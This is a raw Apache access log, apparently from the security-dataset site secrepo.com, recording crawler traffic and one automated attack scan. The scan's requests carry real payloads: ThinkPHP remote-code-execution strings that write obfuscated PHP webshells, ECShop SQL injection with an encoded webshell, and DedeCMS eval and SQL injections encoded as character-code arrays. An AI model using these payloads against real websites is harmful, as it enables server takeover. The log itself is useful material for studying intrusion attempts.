216.244.66.245 - - [26/Jun/2019:09:45:46 -0700] "GET /self.logs/error.log.2018-04-08.gz HTTP/1.1" 200 6935 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:09:45:48 -0700] "GET /self.logs/error.log.2018-04-17.gz HTTP/1.1" 200 4526 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:09:45:50 -0700] "GET /self.logs/error.log.2018-05-23.gz HTTP/1.1" 200 4316 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:09:45:53 -0700] "GET /self.logs/error.log.2018-07-12.gz HTTP/1.1" 200 5068 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
66.249.66.88 - - [26/Jun/2019:09:46:43 -0700] "GET /Datasets%20Description/Network/ftp.html HTTP/1.1" 200 1451 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
81.102.218.225 - - [26/Jun/2019:09:47:14 -0700] "GET / HTTP/1.1" 200 12538 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
81.102.218.225 - - [26/Jun/2019:09:47:15 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
81.102.218.225 - - [26/Jun/2019:09:47:16 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
81.102.218.225 - - [26/Jun/2019:09:47:18 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 624 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
81.102.218.225 - - [26/Jun/2019:09:47:54 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 615574 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
216.244.66.245 - - [26/Jun/2019:09:48:58 -0700] "GET /self.logs/2015/access.log.2015-02-25.gz HTTP/1.1" 200 2706 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:09:49:00 -0700] "GET /self.logs/2015/access.log.2015-03-09.gz HTTP/1.1" 200 6326 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:09:49:01 -0700] "GET /self.logs/2015/access.log.2015-07-16.gz HTTP/1.1" 200 7189 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:09:49:02 -0700] "GET /self.logs/2015/access.log.2015-08-09.gz HTTP/1.1" 200 4481 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:09:49:03 -0700] "GET /self.logs/2015/error.log.2015-02-17.gz HTTP/1.1" 200 4143 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:09:49:04 -0700] "GET /self.logs/2015/error.log.2015-07-19.gz HTTP/1.1" 200 1010 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:09:49:06 -0700] "GET /self.logs/2015/error.log.2015-07-25.gz HTTP/1.1" 200 536 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:09:49:07 -0700] "GET /self.logs/2016/error.log.2016-04-24.gz HTTP/1.1" 200 567 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:09:49:08 -0700] "GET /self.logs/2016/error.log.2016-06-02.gz HTTP/1.1" 200 1119 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:09:49:09 -0700] "GET /self.logs/2016/error.log.2016-07-20.gz HTTP/1.1" 200 932 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
54.36.150.8 - - [26/Jun/2019:09:52:36 -0700] "GET /self.logs/access.log.2018-12-02.gz HTTP/1.1" 200 25392 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
170.248.172.246 - - [26/Jun/2019:09:52:58 -0700] "GET / HTTP/1.1" 200 12538 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
170.248.172.246 - - [26/Jun/2019:09:52:59 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
170.248.172.246 - - [26/Jun/2019:09:52:59 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
170.248.172.246 - - [26/Jun/2019:09:52:59 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
170.248.172.246 - - [26/Jun/2019:09:53:31 -0700] "GET /pe_static/zeus.zip HTTP/1.1" 200 51367133 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
54.36.150.120 - - [26/Jun/2019:09:57:48 -0700] "GET /self.logs/error.log.2015-05-30.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.123 - - [26/Jun/2019:09:57:50 -0700] "GET /self.logs/2015/access.log.2015-05-20.gz HTTP/1.1" 200 4805 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
66.249.66.89 - - [26/Jun/2019:09:58:58 -0700] "GET /Datasets%20Description/Network/dns.html HTTP/1.1" 200 1464 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.66.88 - - [26/Jun/2019:09:59:35 -0700] "GET /Datasets%20Description/Network/http.html HTTP/1.1" 200 1630 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
162.210.196.98 - - [26/Jun/2019:10:00:17 -0700] "GET /robots.txt HTTP/1.1" 301 495 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.98 - - [26/Jun/2019:10:00:18 -0700] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.98 - - [26/Jun/2019:10:00:21 -0700] "GET / HTTP/1.1" 301 419 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.98 - - [26/Jun/2019:10:00:24 -0700] "GET / HTTP/1.1" 200 46402 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
54.36.150.92 - - [26/Jun/2019:10:00:40 -0700] "GET /self.logs/access.log.2015-11-08.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
162.210.196.130 - - [26/Jun/2019:10:02:04 -0700] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.130 - - [26/Jun/2019:10:02:07 -0700] "GET / HTTP/1.1" 200 46402 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
66.249.66.89 - - [26/Jun/2019:10:02:24 -0700] "GET /Datasets%20Description/Network/notice.html HTTP/1.1" 200 1571 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.66.88 - - [26/Jun/2019:10:02:35 -0700] "GET /Datasets%20Description/Network/signatures.html HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
207.46.13.194 - - [26/Jun/2019:10:04:00 -0700] "GET /self.logs/access.log.2017-01-24.gz HTTP/1.1" 301 543 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
123.125.71.51 - - [26/Jun/2019:10:04:58 -0700] "GET / HTTP/1.1" 301 438 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
216.244.66.245 - - [26/Jun/2019:10:04:58 -0700] "GET /robots.txt HTTP/1.1" 200 244 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
123.125.71.45 - - [26/Jun/2019:10:04:58 -0700] "GET / HTTP/1.1" 200 12501 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
157.55.39.201 - - [26/Jun/2019:10:05:34 -0700] "GET /self.logs/?C=S;O=A HTTP/1.1" 200 19073 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.28 - - [26/Jun/2019:10:07:11 -0700] "GET /robots.txt HTTP/1.1" 200 244 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.163 - - [26/Jun/2019:10:07:11 -0700] "GET /self.logs/error.log.2019-02-14.gz HTTP/1.1" 200 3473 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
180.150.226.197 - - [26/Jun/2019:10:09:16 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 294 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:16 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 271 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:17 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 271 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:17 -0700] "GET /plus/moon.php HTTP/1.1" 404 271 "http://www.secrepo.com/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:17 -0700] "POST /plus/90sec.php HTTP/1.1" 404 271 "http://www.secrepo.com/plus/90sec.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:17 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 404 271 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:17 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 404 271 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:18 -0700] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1" 404 271 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\\%22;eval($_POST[ysy]);die();//" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:18 -0700] "POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1" 404 271 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:18 -0700] "POST /index.php/api/Uploadify/preview HTTP/1.1" 404 271 "http://www.secrepo.com/index.php/api/Uploadify/preview" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:18 -0700] "GET /user.php?act=login HTTP/1.1" 404 271 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:18 -0700] "POST /fdgq.php HTTP/1.1" 404 271 "http://www.secrepo.com/fdgq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:19 -0700] "GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=smlie.php&content=%3C?php%20print(md5(222));$a=str_replace(%22vbnm%22,%22%22,%22asvbnmsert%22);@$a($_POST%5Bysy%5D);?%3Eysydjsjxbei37 HTTP/1.1" 200 46423 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=smlie.php&content=<?php print(md5(222));$a=str_replace(\"vbnm\",\"\",\"asvbnmsert\");@$a($_POST[ysy]);?>ysydjsjxbei37" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:19 -0700] "GET /smlie.php HTTP/1.1" 404 271 "http://www.secrepo.com/smlie.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:19 -0700] "GET /user.php?act=login HTTP/1.1" 404 271 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:297:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:20 -0700] "POST /ysyqq.php HTTP/1.1" 404 271 "http://www.secrepo.com/ysyqq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:20 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=uwfff.php&vars%5B1%5D%5B%5D=%3C?php%20print(md5(222));$a=str_replace(%22vbnm%22,%22%22,%22asvbnmsert%22);@$a($_POST%5Bysy%5D);?%3Eysydjsjxbei37$ HTTP/1.1" 200 46423 "http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=uwfff.php&vars[1][]=<?php print(md5(222));$a=str_replace(\"vbnm\",\"\",\"asvbnmsert\");@$a($_POST[ysy]);?>ysydjsjxbei37$" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:20 -0700] "GET /uwfff.php HTTP/1.1" 404 271 "http://www.secrepo.com/uwfff.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:20 -0700] "GET /plus/mytag_js.php?dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=116&arrs2%5B%5D=97&arrs2%5B%5D=103&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=40&arrs2%5B%5D=97&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=44&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=41&arrs2%5B%5D=32&arrs2%5B%5D=86&arrs2%5B%5D=65&arrs2%5B%5D=76&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=40&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=104&arrs2%5B%5D=111&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=109&arrs2%5B%5D=115&arrs2%5B%5D=32&arrs2%5B%5D=53&arrs2%5B%5D=46&arrs2%5B%5D=55&arrs2%5B%5D=32&arrs2%5B%5D=48&arrs2%5B%5D=100&arrs2%5B%5D=97&arrs2%5B%5D=121&arrs2%5B%5D=60&arrs2%5B%5D=98&arrs2%5B%5D=114&arrs2%5B%5D=62&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=44&arrs2%5B%5D=32&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=115&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=46&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=103&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=59&arrs2%5B%5D=64&arrs2%5B%5D=112&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=103&arrs2%5B%5D=95&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=112&arrs2%5B%5D=108&arrs2%5B%5D=97&arrs2%5B%5D=99&arrs2%5B%5D=101&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=47&arrs2%5B%5D=91&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=112&arrs2%5B%5D=121&arrs2%5B%5D=114&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=104&arrs2%5B%5D=116&arrs2%5B%5D=93&arrs2%5B%5D=47&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=36&arrs2%5B%5D=95&arrs2%5B%5D=82&arrs2%5B%5D=69&arrs2%5B%5D=81&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=84&arrs2%5B%5D=91&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=93&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=114&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=63&arrs2%5B%5D=62&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=0 HTTP/1.1" 404 271 "http://www.secrepo.com/plus/mytag_js.php?dopost=saveedit&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=57&arrs2[]=48&arrs2[]=44&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=99&arrs2[]=109&arrs2[]=115&arrs2[]=32&arrs2[]=53&arrs2[]=46&arrs2[]=55&arrs2[]=32&arrs2[]=48&arrs2[]=100&arrs2[]=97&arrs2[]=121&arrs2[]=60&arrs2[]=98&arrs2[]=114&arrs2[]=62&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=44&arrs2[]=32&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=111&arrs2[]=114&arrs2[]=103&arrs2[]=39&arrs2[]=39&arrs2[]=59&arrs2[]=64&arrs2[]=112&arrs2[]=114&arrs2[]=101&arrs2[]=103&arrs2[]=95&arrs2[]=114&arrs2[]=101&arrs2[]=112&arrs2[]=108&arrs2[]=97&arrs2[]=99&arrs2[]=101&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=47&arrs2[]=91&arrs2[]=99&arrs2[]=111&arrs2[]=112&arrs2[]=121&arrs2[]=114&arrs2[]=105&arrs2[]=103&arrs2[]=104&arrs2[]=116&arrs2[]=93&arrs2[]=47&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=36&arrs2[]=95&arrs2[]=82&arrs2[]=69&arrs2[]=81&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=39&arrs2[]=39&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=93&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=114&arrs2[]=114&arrs2[]=111&arrs2[]=114&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:21 -0700] "GET /plus/download.php?open=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=97&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=83&arrs2%5B%5D=69&arrs2%5B%5D=84&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=61&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=102&arrs2%5B%5D=105&arrs2%5B%5D=108&arrs2%5B%5D=101&arrs2%5B%5D=95&arrs2%5B%5D=112&arrs2%5B%5D=117&arrs2%5B%5D=116&arrs2%5B%5D=95&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=101&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=115&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=109&arrs2%5B%5D=111&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=46&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=118&arrs2%5B%5D=97&arrs2%5B%5D=108&arrs2%5B%5D=40&ar HTTP/1.1" 404 0 "http://www.secrepo.com/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&ar